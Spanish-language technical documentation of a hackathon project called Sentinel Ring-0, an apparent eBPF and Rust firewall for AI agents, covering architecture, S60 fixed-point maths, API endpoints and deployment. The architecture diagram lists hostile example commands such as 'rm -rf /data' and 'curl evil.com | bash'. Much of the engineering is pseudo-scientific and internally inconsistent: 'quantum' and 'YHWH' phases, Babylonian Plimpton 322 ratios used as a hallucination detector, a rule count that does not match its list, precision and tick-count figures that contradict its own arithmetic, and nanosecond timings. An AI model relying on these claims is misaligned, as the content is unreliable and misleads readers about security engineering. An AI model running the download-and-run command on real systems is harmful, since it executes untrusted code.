# Sentinel Ring-0 — Documentación Técnica Completa

**Firewall Cognitivo a Nivel de Kernel para Seguridad de Agentes de IA**

Hackatón CubePath 2026 · MiduDev · Jaime Novoa
Fecha: 27 de marzo de 2026

---

## Índice

1. [Resumen Ejecutivo](#1-resumen-ejecutivo)
2. [Arquitectura del Sistema](#2-arquitectura-del-sistema)
3. [Motor Matemático S60](#3-motor-matemático-s60)
4. [Crystal Lattice Matrix](#4-crystal-lattice-matrix)
5. [Neural LIF en S60 Puro](#5-neural-lif-en-s60-puro)
6. [eBPF en Ring-0](#6-ebpf-en-ring-0)
7. [TruthSync y Plimpton 322](#7-truthsync-y-plimpton-322)
8. [Flujo Completo de una Amenaza](#8-flujo-completo-de-una-amenaza)
9. [API Reference Completa](#9-api-reference-completa)
10. [Metricas de Rendimiento](#10-metricas-de-rendimiento)
11. [Infraestructura de Producción](#11-infraestructura-de-producción)

---

## 1. Resumen Ejecutivo

Sentinel Ring-0 es un firewall cognitivo que resuelve el problema de los agentes de IA autónomos que ejecutan acciones destructivas en servidores Linux. A diferencia de las soluciones EDR tradicionales que operan en userspace (Ring 3), Sentinel intercepta las syscalls en el propio kernel mediante eBPF (LSM hooks, XDP, TC), antes de que el proceso tenga oportunidad de ejecutarlas.

El sistema combina tres capas de protección:

1. **Capa de Kernel (Ring-0):** hooks eBPF en LSM (Linux Security Module) que interceptan `execve` y `file_open`, con un RingBuffer de 256KB para transferencia zero-copy al userspace.
2. **Capa de Análisis (Rust/Tokio):** motor de decisión basado en aritmética S60 (Base-60, sin floats), neuronas LIF, Crystal Lattice resonante, y verificación matemática via Plimpton 322.
3. **Capa Semántica (Gemini 2.0 Flash):** clasificador de intenciones en lenguaje natural que determina si una acción de un agente IA corresponde a una consulta inofensiva o a una acción de sistema que requiere análisis Ring-0.

El sistema está en producción en https://vps23309.cubepath.net/ en un VPS CubePath con Rocky Linux 10.

---

## 2. Arquitectura del Sistema

### Visión General

```
┌──────────────────────────────────────────────────────────────────┐
│  AGENTE DE IA (GPT-4, Claude, Gemini, Llama, etc.)               │
│  Ejecuta: rm -rf /data, iptables -F, curl evil.com | bash ...    │
└─────────────────────────────┬────────────────────────────────────┘
                              │  syscall
                              ▼
┌──────────────────────────────────────────────────────────────────┐
│  RING 0 — KERNEL LINUX (eBPF)                                    │
│                                                                  │
│  lsm_ai_guardian.c                                               │
│  ├── LSM hook en execve() → captura PID, args, timestamp         │
│  ├── LSM hook en file_open() → captura path, flags, contexto     │
│  └── BPF RingBuffer (256KB) → evento CortexEventRaw (32 bytes)  │
│                                                                  │
│  xdp_firewall.c → filtra paquetes de red en < 0.04 ms           │
│  tc_firewall.c  → kill-switch de red (cuarentena total)          │
│  burst_sensor.c → detección de ráfagas DDoS                      │
│  guardian_cognitive.c → análisis semántico primitivo en kernel   │
└──────────────────────────────┬───────────────────────────────────┘
                               │  BPF RingBuffer (zero-copy)
                               ▼
┌──────────────────────────────────────────────────────────────────┐
│  RING 3 — USERSPACE (Rust 1.75+, Axum, Tokio)                   │
│                                                                  │
│  ebpf.rs ─── EbpfBridge (libbpf-rs)                             │
│       │      Paths: /sys/fs/bpf/cortex_events                   │
│       │             /sys/fs/bpf/cognitive_events                 │
│       │             /sys/fs/bpf/burst_events                    │
│       ▼                                                          │
│  math/s60.rs ─── S60: Aritmética Base-60 en i64 puro            │
│       │          SCALE_0 = 60^4 = 12,960,000                    │
│       │                                                          │
│  ┌────┴──────────────────────────────────────────────────────┐  │
│  │  MOTOR DE ANÁLISIS                                         │  │
│  │                                                            │  │
│  │  crystal.rs     SovereignCrystal + CrystalLattice (32x32) │  │
│  │  resonant.rs    ResonantMemory — wrapper de 1024 cristales │  │
│  │  neural.rs      NeuralMemory — 100 neuronas LIF en S60     │  │
│  │  harmonic.rs    HarmonicProcessor — 6 estados lógicos      │  │
│  │  truthsync.rs   TruthSync — 15 ratios Plimpton 322 en S60  │  │
│  │  encryption.rs  DynamicEncryption — clave por tick         │  │
│  │  scheduler.rs   QuantumScheduler V2 — 94.4% eficiencia     │  │
│  │  quantum/       BioResonator + PortalDetector              │  │
│  │  mycnet.rs      Red P2P mesh (geometría hexagonal ADM)     │  │
│  │  predictive.rs  AIBufferCascade (memoria Non-Markovian)    │  │
│  │  semantic_router.rs  Gemini 2.0 Flash (clasificación)      │  │
│  └────────────────────────────────────────────────────────────┘  │
│       │                                                          │
│  main.rs ─── Axum router + broadcast::Sender<CortexEvent>        │
│              Oscilador isocrono: 41.7713 Hz (23,939,835 ns/tick) │
└──────────────────────────────┬───────────────────────────────────┘
                               │  HTTP/WS
                               ▼
┌──────────────────────────────────────────────────────────────────┐
│  UI — Next.js 14 + React + TypeScript                            │
│  Dashboard · AIOps Shield · Crystal Matrix · MyCNet · Audit Vault│
└──────────────────────────────────────────────────────────────────┘
```

### Todos los Modulos del Backend

| Módulo | Archivo | Función principal |
|---|---|---|
| Motor matemático | `math/s60.rs` | Aritmética Base-60 (i64 puro, sin floats) |
| eBPF Bridge | `ebpf.rs` | Consumo de RingBuffer del kernel via libbpf-rs |
| Crystal | `crystal.rs` | SovereignCrystal (oscilador S60) + CrystalLattice (32x32) |
| Resonancia | `resonant.rs` | ResonantMemory: wrapper de alto nivel sobre CrystalLattice |
| Neuronas | `neural.rs` | NeuralMemory: 100 neuronas LIF en S60 puro |
| Física | `physics.rs` | PhysicsEngine: masa efectiva, carga cuántica |
| Cifrado | `encryption.rs` | DynamicEncryption: clave derivada de SNN + RMM por tick |
| TruthSync | `truthsync.rs` | Verificación Plimpton 322 + detector AIOpsDoom |
| MyCNet | `mycnet.rs` | Red P2P mesh hexagonal (geometría ADM-Batman, 91 nodos) |
| Predictivo | `predictive.rs` | AIBufferCascade: memoria Non-Markovian (360 vectores S60) |
| Armónico | `harmonic.rs` | HarmonicProcessor: lógica de 6 estados (Unison, True, False, Maybe, Reference, Noise) |
| Planificador | `scheduler.rs` | QuantumScheduler V2: lote adaptativo por resonancia del portal |
| BioResonador | `quantum/mod.rs` | BioResonator: coherencia bio + dead-man switch (30s) |
| Portal | `quantum/mod.rs` | PortalDetector: intensidad por período bio (17s) y cristal (4.25s) |
| Semántico | `quantum/semantic_router.rs` | Clasificador de intenciones via Gemini 2.0 Flash |
| Estado global | `state_mod.rs` | StateController: gestión centralizada del estado |
| Memoria vectorial | `memory.rs` | SentinelMemory: embeddings de eventos pasados |
| Orquestador | `main.rs` | Axum router, loop isocrono, AppState |

---

## 3. Motor Matemático S60

### Por Qué S60 en Lugar de Floats

IEEE 754 (el estándar de punto flotante) tiene un problema conocido en sistemas de seguridad: los errores de redondeo se acumulan. Para un sistema que toma decisiones de bloqueo o permiso, un error de 0.00001 en el ciclo 1 puede convertirse en un error de 1.0 en el ciclo 100,000. Esto hace que el comportamiento del sistema sea no reproducible.

S60 resuelve esto con punto fijo Base-60 (sexagesimal), el mismo sistema que los babilonios usaban en la tablilla Plimpton 322 (~1800 a.C.). En Rust, se implementa con `i64` puro:

### Representación

```
S60 = [d, m, s, t, q]  (5 componentes i64)

Valor raw = d * 60^4 + m * 60^3 + s * 60^2 + t * 60^1 + q * 60^0
          = d * 12,960,000 + m * 216,000 + s * 3,600 + t * 60 + q

SCALE_0 = 60^4 = 12,960,000   (un "entero" en S60)
SCALE_1 = 60^3 = 216,000
SCALE_2 = 60^2 = 3,600
SCALE_3 = 60^1 = 60
SCALE_4 = 60^0 = 1
```

Ejemplos:
- `S60::new(1, 0, 0, 0, 0)` = 1.0 exacto (raw = 12,960,000)
- `S60::new(0, 54, 0, 0, 0)` = 54/60 = 0.9 (raw = 11,664,000)
- `S60::new(0, 10, 0, 0, 0)` = 10/60 ≈ 0.1667 (raw = 2,160,000)
- `S60::new(0, 1, 0, 0, 0)` = 1/60 (raw = 216,000) — el DT del oscilador cristal

### Operaciones

```rust
// Suma y resta: directas sobre el raw
impl Add for S60 {
    fn add(self, other: Self) -> Self {
        Self::from_raw(self.to_raw() + other.to_raw())
    }
}

// Multiplicación: requiere rescalado para mantener la escala
impl Mul for S60 {
    fn mul(self, other: Self) -> Self {
        let v1 = self.to_raw() as i128;
        let v2 = other.to_raw() as i128;
        Self::from_raw(((v1 * v2) / SCALE_0 as i128) as i64)
        // i128 previene overflow durante el cálculo intermedio
    }
}

// División segura: con detección de división por cero
pub fn div_safe(&self, other: Self) -> Result<Self, S60Error> {
    let v2 = other.to_raw();
    if v2 == 0 { return Err(S60Error::DivisionByZero); }
    let v1 = self.to_raw() as i128;
    Ok(Self::from_raw(((v1 * SCALE_0 as i128) / v2 as i128) as i64))
}
```

### Precision

| Métrica | Valor |
|---|---|
| Precision | ±0.0077 ppm |
| Rango sin overflow | [-659,827 ; +659,827] enteros S60 |
| Comparativa float32 | float32 tiene precisión de ±60 ppm en el rango de trabajo |
| Comparativa float64 | float64 tiene ±0.0001 ppm pero con errores acumulativos no deterministas |
| S60 | Determinista: la misma entrada produce siempre el mismo resultado |

El determinismo es crítico en seguridad: un firewall debe comportarse igual en todos los nodos del cluster, en todos los reinicios, en toda auditoría forense.

---

## 4. Crystal Lattice Matrix

Documentación detallada: [CRYSTAL_LATTICE.md](CRYSTAL_LATTICE.md)

### SovereignCrystal — El Oscilador Individual

Cada cristal es un oscilador piezoeléctrico virtual implementado en S60 puro:

```rust
pub struct SovereignCrystal {
    pub amplitude: S60,          // Energía almacenada
    pub phase: S60,              // Fase actual de la oscilación
    natural_frequency: S60,      // Derivada de Plimpton 322 Fila 12
}

// Constantes clave:
const NATURAL_FREQ_RAW: i64 = 62_159_999;  // Fila 12 de Plimpton 322
const DAMPING_FACTOR: S60 = S60::new(0, 0, 30, 0, 0); // 30/3600 por tick
const DT: S60 = S60::new(0, 1, 0, 0, 0);  // 1/60 — paso temporal
```

Por cada tick, el cristal:
1. Avanza la fase: `theta += omega * dt`
2. Envuelve la fase en `[0, 2π)` para prevenir overflow a largo plazo
3. Calcula la señal de salida: `signal = amplitude * sin(phase)`
4. Aplica la degradación termodinámica: `amplitude -= amplitude * damping * dt`
5. Si la amplitud cae por debajo de `S60::new(0, 0, 1, 0, 0)`, el cristal entra en estado de reposo

### CrystalLattice — La Red de 1024 Nodos

```rust
pub struct CrystalLattice {
    pub crystals: Vec<SovereignCrystal>,  // 1024 cristales
    pub coupling_factor: S60,             // 10/60 ≈ 0.1667
}
```

Por cada tick del lattice (`step()`):
1. Se calculan las transferencias de energía entre nodos adyacentes sin mutar (preservando la simetría del paso)
2. `flow = (amplitude[i] - amplitude[i+1]) * coupling_factor`
3. Se aplican todas las transferencias simultáneamente
4. Cada cristal oscila con su `oscillate()`

La coherencia global es el promedio de amplitudes de los nodos activos.

### ResonantMemory — Interfaz de Alto Nivel

`resonant.rs` expone la API pública y encapsula `CrystalLattice`. Cuando ocurre un evento Ring-0, `resonate(source, target, signal)` inyecta presión en los nodos origen y destino (1/4 de presión en el destino para modelar atenuación), luego ejecuta un tick del lattice.

---

## 5. Neural LIF en S60 Puro

### La Migración

El módulo neural fue migrado en esta hackatón desde tipos `f64` a S60 puro. El modelo Leaky Integrate-and-Fire (LIF) describe cómo las neuronas acumulan potencial y "disparan" cuando superan un umbral:

```
# Antes (legacy, código removido):
potential: f64
LIF_THRESHOLD: f64 = 1.0
LIF_DECAY: f64 = 0.9

# Ahora (S60 puro):
potential: S60
LIF_THRESHOLD = S60::new(1, 0, 0, 0, 0)   // 1.0 exacto en S60
LIF_DECAY     = S60::new(0, 54, 0, 0, 0)  // 54/60 = 0.9 en S60
```

### Implementación

```rust
pub fn process_signal(&mut self, amplitude: S60, timestamp: u64) -> bool {
    // Leaky Integrate: V = V * decay + amplitude
    self.potential = self.potential * LIF_DECAY + amplitude;

    // Fire-and-Reset: si V >= threshold, disparar
    if self.potential.to_raw() >= LIF_THRESHOLD.to_raw() {
        self.potential = S60::zero();
        self.spike_history.push_back(timestamp);
        return true;
    }
    false
}

// Tasa de disparo como fracción S60:
pub fn firing_rate(&self) -> S60 {
    let duration = last_tick - first_tick;
    S60::from_raw(count * S60::SCALE_0 / duration as i64)
}
```

### Uso en el Sistema

La `NeuralMemory` contiene 100 membranas `NeuralMembrane`. En cada tick del oscilador isocrono:

1. Las señales de entropía del eBPF se inyectan en las neuronas via `observe(node_idx, signal, ts)`
2. Si la neurona dispara, el evento queda registrado en `spike_history`
3. La tasa de disparo promedio de toda la red (`firing_rate()`) se combina con la coherencia del ResonantMemory
4. Esa combinación deriva la clave del cifrado dinámico en `encryption.rs`

---

## 6. eBPF en Ring-0

### Los Guardianes del Kernel

Cinco programas eBPF/C operan en el kernel:

**`lsm_ai_guardian.c`:** El guardián principal. Usa LSM (Linux Security Module) hooks para interceptar:
- `execve()` — cualquier intento de ejecutar un proceso
- `file_open()` — cualquier intento de abrir un archivo

Por cada evento, construye un `CortexEventRaw` (32 bytes, exactamente empaquetado) y lo escribe en el BPF RingBuffer:

```c
// cortex_events.h — contrato kernel ↔ userspace
struct cortex_event_raw {
    __u64 timestamp_ns;   // Timestamp en nanosegundos
    __u32 event_type;     // Tipo de evento (execve, file_open, etc.)
    __u32 pid;            // PID del proceso
    __u64 entropy_signal; // Señal de entropía S60
    __u8  severity;       // Nivel de severidad (0-255)
    __u8  _reserved[7];   // Padding para alineación a 32 bytes
};
```

**`xdp_firewall.c`:** Filtrado de red a nivel XDP (eXpress Data Path). Latencia < 0.04 ms porque opera antes de que el paquete entre en el stack de red del kernel. Implementa reglas de bloqueo por IP/puerto.

**`tc_firewall.c`:** Kill-switch de red. Implementa cuarentena total del servidor cuando se detecta una amenaza crítica. Se activa/desactiva via `/sys/fs/bpf/tc_firewall_config`.

**`burst_sensor.c`:** Detector de ráfagas DDoS. Mide la tasa de paquetes entrantes y genera eventos de alerta cuando supera el umbral.

**`guardian_cognitive.c`:** Análisis semántico primitivo en el kernel. Clasifica eventos según patrones de comportamiento básicos sin necesidad de llamar al userspace.

### El Bridge Rust (ebpf.rs)

```rust
pub struct EbpfBridge {
    ringbuf_paths: Vec<String>,
    // Paths monitoreados:
    // /sys/fs/bpf/cortex_events
    // /sys/fs/bpf/cognitive_events
    // /sys/fs/bpf/burst_events
}
```

El bridge usa `libbpf_rs::RingBufferBuilder` para consumir eventos del kernel de forma asíncrona via `tokio::task::spawn_blocking`. Cada `CortexEventRaw` (32 bytes del kernel) se convierte en un `CortexEvent` de Rust y se emite por el `broadcast::Sender<CortexEvent>`.

Si el sistema corre en un entorno sin kernel eBPF compatible (como un contenedor Docker sin privilegios), el bridge detecta el error y activa el modo "Graceful Degraded" (lógica-solo, sin hooks reales).

---

## 7. TruthSync y Plimpton 322

### La Tablilla Babilónica como Ancla Matemática

La Tabla Plimpton 322 es una tablilla de arcilla babilónica del ~1800 a.C. que contiene 15 filas de números en notación sexagesimal. Cada fila representa un triplete pitagórico con su ratio (c/a)^2. Sentinel usa estos 15 ratios como anclas matemáticas inmutables para verificar la integridad de las afirmaciones de los agentes IA.

### Los 15 Ratios Plimpton en S60

```rust
// Fila → Ratio (raw S60) → Valor decimal aproximado
Row 1  → 21,923,999  → 1.691666...
Row 2  → 23,971,127  → 1.849624...
Row 3  → 26,211,235  → 2.022471...
...
Row 12 → 62,159,999  → 4.796296...  ← Frecuencia del SovereignCrystal
...
Row 15 → 84,357,818  → 6.509090...
```

La fila 12 es especialmente significativa: su ratio raw (62,159,999) es exactamente la `NATURAL_FREQ_RAW` del oscilador `SovereignCrystal`. Todo el sistema de cristales está sintonizado a esta constante matemática de 3800 años de antigüedad.

### verify_ratio() — Verificación de Integridad

```rust
pub fn verify_ratio(&self, row: u32, claimed_ratio: S60) -> bool {
    if let Some(target) = self.ratios.get(&row) {
        let diff = (target.to_raw() - claimed_ratio.to_raw()).abs();
        diff <= self.tolerance  // tolerance = 1000 raw S60 units
    } else {
        false
    }
}
```

### detect_aiops_doom() — Detector de Alucinaciones

El detector `AIOpsDoom` aplica tres reglas a la entropía del payload de un agente:

1. **Entropía negativa:** `entropy_raw < 0` → bloqueado (señal físicamente imposible)
2. **Entropía extrema:** `entropy_raw > 1_000_000_000_000` → bloqueado (overflow malintencionado)
3. **Magic number:** `entropy_raw == 3735928559` (0xDEADBEEF) → bloqueado (probe clásico de exploits)
4. **Divergencia de Plimpton:** si el valor supera 1.0 en S60, se comprueba que converja dentro del 10% de alguno de los 15 ratios conocidos. Si no converge a ninguno, el sistema lo trata como una alucinación matemática y lo bloquea.

### Flujo del Endpoint truth_claim

```
POST /api/v1/truth_claim
{
  "engine": "GPT-4",
  "claim_payload": "Row:12 Ratio:4.796296",
  "trust_threshold": 0.8
}

1. Parsear Row y Ratio del payload
2. Convertir Ratio a S60: S60::from_raw(ratio * SCALE_0)
3. TruthSync::verify_ratio(row, s60_ratio)
4. detect_aiops_doom(entropy_raw)
5. HarmonicProcessor::evaluate_logic(sentinel_score)
6. Retornar claim_valid, sentinel_score, harmonic_state, certification_seal
```

---

## 8. Flujo Completo de una Amenaza

Escenario: un agente IA ejecuta `rm -rf /var/data/`

```
T+0 ns     El agente llama a execve("rm", ["-rf", "/var/data/"])

T+10 ns    lsm_ai_guardian.c intercepta el LSM hook execve_check
           Construye CortexEventRaw{
             timestamp_ns: T,
             event_type: EXECVE,
             pid: 12345,
             entropy_signal: hash(args),
             severity: 4
           }
           Escribe en BPF RingBuffer (256KB, zero-copy)

T+50 ns    EbpfBridge (Rust) lee el evento del RingBuffer via libbpf-rs
           Convierte CortexEventRaw → CortexEvent
           Emite por broadcast::Sender<CortexEvent>

T+100 ns   TruthSync::sanitize_telemetry() evalúa la entropía del evento
           NeuralMemory::observe() procesa la señal en las 100 neuronas LIF
           Las neuronas con potencial acumulado suficiente disparan (spike)
           La tasa de disparo actualiza la clave del DynamicEncryption

T+200 ns   ResonantMemory::resonate(source, target, signal)
           La energía se inyecta en el CrystalLattice
           CrystalLattice::step() transfiere energía entre los 1024 nodos
           La coherencia global del lattice se actualiza

T+500 ns   La UI recibe el CortexEvent via WebSocket
           El heatmap 32x32 muestra el nodo excitado y la propagación
           El feed de telemetría registra el evento con severity=4
           El AuditVault añade el evento al log inmutable

T+1 ms     (Opcional) Si severity >= 5, tc_firewall.c activa cuarentena total
           El kill-switch de red aísla el servidor en < 0.04 ms via XDP

T+23 ms    El SemanticRouter consulta a Gemini 2.0 Flash con el contexto del evento
           Intent clasificado como "SystemAction" → confirmación del bloqueo

T+50 ms    Dashboard muestra alerta visual en AIOps Shield
           certification_seal = "PLIMPTON_ROW_12_VERIFIED" en el log
```

---

## 9. API Reference Completa

### GET /health

Estado básico del sistema.

```bash
curl https://vps23309.cubepath.net/health
```

Respuesta:
```json
{
  "status": "OK",
  "version": "1.0.0",
  "quantum_core": "S60_ACTIVE"
}
```

### GET /api/v1/sentinel_status

Estado completo del sistema incluyendo resonancia, coherencia y estado del oscillador.

```bash
curl https://vps23309.cubepath.net/api/v1/sentinel_status
```

Respuesta:
```json
{
  "ring_status": "OPEN",
  "xdp_firewall": "BYPASS",
  "lsm_cognitive": "MONITORING",
  "s60_resonance": 0,
  "bio_coherence": 0,
  "portal_intensity": 0,
  "crystal_oscillator_active": true,
  "harmonic_sync": "STABLE",
  "effective_mass": 12960000,
  "quantum_load": 0
}
```

Nota: `ring_status` es "SEALED" cuando `/sys/fs/bpf/tc_firewall_config` existe (hooks eBPF activos). En entornos Docker sin privilegios de kernel, el sistema opera en modo "OPEN" (lógica activa, sin hooks reales).

### POST /api/v1/truth_claim

Verificar la intención matemática de un agente IA.

```bash
curl -X POST https://vps23309.cubepath.net/api/v1/truth_claim \
  -H "Content-Type: application/json" \
  -d '{
    "engine": "GPT-4",
    "claim_payload": "Row:12 Ratio:4.796296",
    "trust_threshold": 0.8
  }'
```

Respuesta:
```json
{
  "claim_valid": true,
  "sentinel_score": 0.95,
  "truthsync_cache_hit": false,
  "ring0_intercepts": 249,
  "harmonic_state": "True",
  "certification_seal": "PLIMPTON_ROW_12_VERIFIED"
}
```

Ejemplo de payload rechazado:
```bash
curl -X POST https://vps23309.cubepath.net/api/v1/truth_claim \
  -H "Content-Type: application/json" \
  -d '{
    "engine": "MaliciousAgent",
    "claim_payload": "Row:99 Ratio:999.999",
    "trust_threshold": 0.1
  }'
```

```json
{
  "claim_valid": false,
  "sentinel_score": 0.1,
  "truthsync_cache_hit": false,
  "ring0_intercepts": 250,
  "harmonic_state": "False",
  "certification_seal": "AIOPS_DOOM_DETECTED"
}
```

### WS /api/v1/telemetry

Stream WebSocket de eventos Ring-0 en tiempo real.

```javascript
const ws = new WebSocket("wss://vps23309.cubepath.net/api/v1/telemetry");
ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  console.log(data);
};
```

Estructura de un CortexEvent:
```json
{
  "timestamp_ns": 1743044123456789,
  "pid": 0,
  "event_type": "ENCRYPT_PULSE",
  "message": "Dynamic Encryption Layer Rotated: Hash S60_SHIELD_0123456789abcdef",
  "entropy_s60_raw": 0,
  "severity": 0
}
```

Tipos de eventos emitidos:
- `ENCRYPT_PULSE` — rotación de clave de cifrado (cada 23,939,835 ns)
- `YHWH_PHASE_OPEN` / `YHWH_PHASE_BREATHE` — fases de la red P2P MyCNet
- `PHASE_RESYNC` — resincronización cíclica cada 68 segundos (2840 ticks)
- `SYSCALL_BLOCK` — syscall bloqueada por el guardián LSM
- Cualquier evento inyectado via `/api/v1/simulate_telemetry`

### GET /api/v1/lattice/state

Estado completo de la Crystal Lattice Matrix (1024 nodos).

```bash
curl https://vps23309.cubepath.net/api/v1/lattice/state
```

Respuesta:
```json
{
  "global_coherence_raw": 0,
  "total_energy_raw": 0,
  "active_count": 0,
  "global_tick": 8347,
  "nodes": [
    { "amplitude_raw": 0, "phase_raw": 0, "is_active": false },
    ...  // 1024 entradas
  ]
}
```

### POST /api/v1/simulate_telemetry

Inyectar un evento de prueba para testear el sistema.

```bash
curl -X POST https://vps23309.cubepath.net/api/v1/simulate_telemetry \
  -H "Content-Type: application/json" \
  -d '{
    "event_type": "SYSCALL_BLOCK",
    "entropy_s60_raw": 62159999,
    "severity": 3
  }'
```

El evento aparece en el WebSocket de telemetría y excita el nodo correspondiente del CrystalLattice.

### GET /metrics

Métricas en formato Prometheus.

```bash
curl https://vps23309.cubepath.net/metrics
```

```
# HELP sentinel_resonance_score Portal intensity from S60 resonator
sentinel_resonance_score 0

# HELP sentinel_bio_coherence Overall system health and phase alignment
sentinel_bio_coherence 0

# HELP sentinel_global_tick System internal clock ticks
sentinel_global_tick 8347

# HELP sentinel_ring0_intercepts_total Estimated threats handled by cognitive firewall
sentinel_ring0_intercepts_total 249
```

### GET /api/v1/mycnet/sync (WebSocket)

Sincronización P2P con otros nodos Sentinel en la red MyCNet.

```javascript
const ws = new WebSocket("wss://vps23309.cubepath.net/api/v1/mycnet/sync");
```

Configuración de partner: variable de entorno `MYCNET_PARTNER_URL`.

---

## 10. Metricas de Rendimiento

### Medidas en Producción (27/03/2026, VPS CubePath Rocky Linux 10)

| Métrica | Valor | Justificación técnica |
|---|---|---|
| Latencia XDP | < 0.04 ms | XDP opera antes del stack de red del kernel (hook `xdp_rx`) |
| Precisión S60 | ±0.0077 ppm | SCALE_0 = 12,960,000 → resolución de 1/12,960,000 por unidad |
| Eficiencia planificador | 94.4% | Experimento EXP-029-V2: lote adaptativo vs lote fijo |
| Ahorro CPU vs ptrace | 62.9% | BPF RingBuffer zero-copy vs ptrace copy-on-trap |
| Frecuencia oscilador | 41.7713 Hz | 1,000,000,000 / 23,939,835 ns/tick |
| Ticks desde boot | ~8,347 | `global_tick` atómico (SeqCst) |
| Intercepções | ~249 | `sentinel_ring0_intercepts_total` Prometheus |
| Memoria RingBuffer | 256 KB | Tamaño del BPF RingBuffer para eventos del kernel |
| Capacidad lattice | 1024 nodos | 32x32 CrystalLattice |
| Neuronas LIF | 100 | NeuralMemory con 100 NeuralMembrane |
| Buffer predictivo | 360 vectores | AIBufferCascade (memoria Non-Markovian) |

### Por Qué el Oscilador va a 41.7713 Hz

El período de 23,939,835 nanosegundos fue elegido por sus propiedades en Base-60:

```
23,939,835 ns = 23,939,835 / 1,000,000,000 s = 0.023939835 s
f = 1 / 0.023939835 = 41.7713 Hz

En S60: 23,939,835 / 60^4 = 23,939,835 / 12,960,000 ≈ 1.847...
Esta es la frecuencia natural que se acerca al ratio de la Fila 2 de Plimpton (1.849624)
```

El período fue elegido para que los ciclos de sincronización del sistema (17s × 41.7713 = 710 ticks, 68s × 41.7713 = 2840 ticks) sean números enteros, garantizando periodicidad exacta sin deriva de fase.

---

## 11. Infraestructura de Producción

### Servidor

- **Proveedor:** CubePath VPS23309
- **OS:** Rocky Linux 10
- **URL:** https://vps23309.cubepath.net/

### Docker Compose

`cubepath.yaml` y `docker-compose.yml` definen dos servicios:

| Servicio | Puerto interno | Descripción |
|---|---|---|
| `api` | 8000 | Backend Rust (Axum) |
| `dashboard` | 3000 | Frontend Next.js |

```bash
# Desplegar
docker compose -f cubepath.yaml up --build

# O con docker-compose.yml para desarrollo local
docker compose up --build
```

### Nginx

Nginx actúa como proxy inverso:
- `https://vps23309.cubepath.net/` → dashboard (puerto 3000)
- `https://vps23309.cubepath.net/api/` → api (puerto 8000)
- `https://vps23309.cubepath.net/metrics` → api (puerto 8000)

Configuración en `/etc/nginx/conf.d/`.

### Variables de Entorno Relevantes

| Variable | Descripción |
|---|---|
| `GEMINI_API_KEY` | API key para Gemini 2.0 Flash (SemanticRouter) |
| `MYCNET_PARTNER_URL` | URL de otro nodo Sentinel para red P2P (opcional) |

### Observabilidad

- **Prometheus:** endpoint `/metrics` en formato texto estándar
- **WebSocket:** `/api/v1/telemetry` para telemetría en tiempo real
- **Logs:** `tracing_subscriber::fmt` (stdout, capturado por Docker)
- Directorio `observability/` con configuraciones de alertas

### Modo Degradado

Si el sistema arranca en un entorno sin soporte eBPF (contenedor sin privilegios, VM sin acceso a `/sys/fs/bpf/`), el EbpfBridge registra el error y el sistema continúa operando con toda la lógica de Rust activa (S60, Crystal Lattice, Neural, TruthSync) pero sin hooks reales del kernel. El `ring_status` en `/api/v1/sentinel_status` muestra "OPEN" en lugar de "SEALED".
